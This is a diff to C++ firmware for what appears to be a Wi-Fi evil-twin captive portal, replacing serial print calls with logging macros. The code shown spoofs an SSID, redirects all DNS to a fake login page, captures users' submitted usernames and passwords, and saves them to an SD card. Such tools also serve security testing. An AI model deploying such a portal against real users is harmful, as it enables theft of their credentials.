@@ -6,6 +6,7 @@
 #include <SD.h>
 #include "config/config.h"
 #include "../storage/capture_registry.h"
+#include "utils/log.h"
 
 namespace ap {
 
@@ -330,18 +331,18 @@ void ArduinoCaptivePortal::setSSID(const char* ssid) {
     if (ssid) {
         strncpy(currentSSID_, ssid, sizeof(currentSSID_) - 1);
         currentSSID_[sizeof(currentSSID_) - 1] = '\0';
-        Serial.printf("[ArduinoCaptive] setSSID called: '%s'\n", currentSSID_);
+        LOG_D("CAPTIVE", "setSSID called: '%s'", currentSSID_);
     }
 }
 
 bool ArduinoCaptivePortal::saveCredentialsToSD() {
     if (credentialCount_ == 0) {
-        Serial.println("[ArduinoCaptive] No credentials to save");
+        LOG_D("CAPTIVE", "No credentials to save");
         return false;
     }
-    
+
     // Create safe SSID for filename
-    Serial.printf("[ArduinoCaptive] saveCredentialsToSD: currentSSID_='%s'\n", currentSSID_);
+    LOG_D("CAPTIVE", "saveCredentialsToSD: currentSSID_='%s'", currentSSID_);
     char safeSSID[33];
     strncpy(safeSSID, currentSSID_[0] ? currentSSID_ : "unknown", sizeof(safeSSID) - 1);
     for (char* p = safeSSID; *p; p++) {
@@ -361,7 +362,7 @@ bool ArduinoCaptivePortal::saveCredentialsToSD() {
     // Open file for writing
     File file = SD.open(filepath, FILE_WRITE);
     if (!file) {
-        Serial.printf("[ArduinoCaptive] Failed to open: %s\n", filepath);
+        LOG_E("CAPTIVE", "Failed to open: %s", filepath);
         return false;
     }
     
@@ -386,7 +387,7 @@ bool ArduinoCaptivePortal::saveCredentialsToSD() {
     // Update registry for live C indicator
     adversary::CaptureRegistry::getInstance().addCredentials(currentSSID_);
     
-    Serial.printf("[ArduinoCaptive] Saved %zu credentials to: %s\n", credentialCount_, filepath);
+    LOG_I("CAPTIVE", "Saved %zu credentials to: %s", credentialCount_, filepath);
     return true;
 }
 
@@ -405,7 +406,7 @@ bool ArduinoCaptivePortal::start(const char* title) {
     portalTitle_[sizeof(portalTitle_) - 1] = '\0';
     
     IPAddress apIP = WiFi.softAPIP();
-    Serial.printf("[ArduinoCaptive] Starting on IP: %s\n", apIP.toString().c_str());
+    LOG_I("CAPTIVE", "Starting on IP: %s", apIP.toString().c_str());
     
     // Delete any existing server objects to fully release sockets
     if (dnsServer_) {
@@ -432,26 +433,26 @@ bool ArduinoCaptivePortal::start(const char* title) {
             dnsStarted = true;
             break;
         }
-        Serial.printf("[ArduinoCaptive] DNS start attempt %d failed, retrying...\n", retry + 1);
+        LOG_W("CAPTIVE", "DNS start attempt %d failed, retrying...", retry + 1);
         delay(200);
     }
     
     if (!dnsStarted) {
-        Serial.println("[ArduinoCaptive] ERROR: DNS server failed to start after retries!");
+        LOG_E("CAPTIVE", "DNS server failed to start after retries!");
         delete dnsServer_;
         dnsServer_ = nullptr;
         delete webServer_;
         webServer_ = nullptr;
         return false;
     }
-    Serial.println("[ArduinoCaptive] DNS server started (wildcard redirect)");
+    LOG_I("CAPTIVE", "DNS server started (wildcard redirect)");
     
     // Setup HTTP routes
     setupRoutes();
     
     // Start HTTP server
     webServer_->begin();
-    Serial.println("[ArduinoCaptive] HTTP server started on port 80");
+    LOG_I("CAPTIVE", "HTTP server started on port 80");
     
     running_ = true;
     requestCount_ = 0;
@@ -463,7 +464,7 @@ bool ArduinoCaptivePortal::start(const char* title) {
 void ArduinoCaptivePortal::stop() {
     if (!running_) return;
     
-    Serial.println("[ArduinoCaptive] Stopping...");
+    LOG_I("CAPTIVE", "Stopping...");
     
     // Stop and delete servers to fully release sockets
     if (webServer_) {
@@ -482,8 +483,8 @@ void ArduinoCaptivePortal::stop() {
     delay(100);  // Brief delay for socket cleanup
     
     running_ = false;
-    
-    Serial.println("[ArduinoCaptive] Stopped");
+
+    LOG_I("CAPTIVE", "Stopped");
 }
 
 void ArduinoCaptivePortal::handleRequests() {
@@ -530,7 +531,7 @@ void ArduinoCaptivePortal::setupRoutes() {
 void ArduinoCaptivePortal::handleRoot() {
     if (!webServer_) return;
     requestCount_++;
-    Serial.printf("[ArduinoCaptive] Serving portal page (request #%lu)\n", requestCount_);
+    LOG_D("CAPTIVE", "Serving portal page (request #%lu)", requestCount_);
     webServer_->send(200, "text/html", getPortalHTML());
 }
 
@@ -542,8 +543,8 @@ void ArduinoCaptivePortal::handleCaptiveRedirect() {
     IPAddress apIP = WiFi.softAPIP();
     String redirectUrl = "http://" + apIP.toString() + "/";
     
-    Serial.printf("[ArduinoCaptive] Captive redirect: %s -> %s\n",
-                  webServer_->uri().c_str(), redirectUrl.c_str());
+    LOG_D("CAPTIVE", "Captive redirect: %s -> %s",
+          webServer_->uri().c_str(), redirectUrl.c_str());
     
     // Send 302 redirect to trigger captive portal popup
     webServer_->sendHeader("Location", redirectUrl, true);
@@ -570,7 +571,7 @@ void ArduinoCaptivePortal::handleLogin() {
             // Log the capture event only — never the captured username/password.
             // These are third-party secrets; printing them to serial would leak
             // them to anyone with USB access to the device (slice-0035).
-            Serial.printf("[ArduinoCaptive] Credential captured (%zu total)\n", credentialCount_);
+            LOG_I("CAPTIVE", "Credential captured (%zu total)", credentialCount_);
 
             if (onCredential_) {
                 onCredential_(cred);
@@ -579,7 +580,7 @@ void ArduinoCaptivePortal::handleLogin() {
             // Auto-save to SD card after each credential capture
             saveCredentialsToSD();
         } else {
-            Serial.println("[ArduinoCaptive] Credential array full!");
+            LOG_W("CAPTIVE", "Credential array full!");
         }
     }
     
@@ -590,7 +591,7 @@ void ArduinoCaptivePortal::handleNotFound() {
     if (!webServer_) return;
     requestCount_++;
     // Redirect everything to the portal
-    Serial.printf("[ArduinoCaptive] Redirecting: %s\n", webServer_->uri().c_str());
+    LOG_D("CAPTIVE", "Redirecting: %s", webServer_->uri().c_str());
     webServer_->send(200, "text/html", getPortalHTML());
 }
 
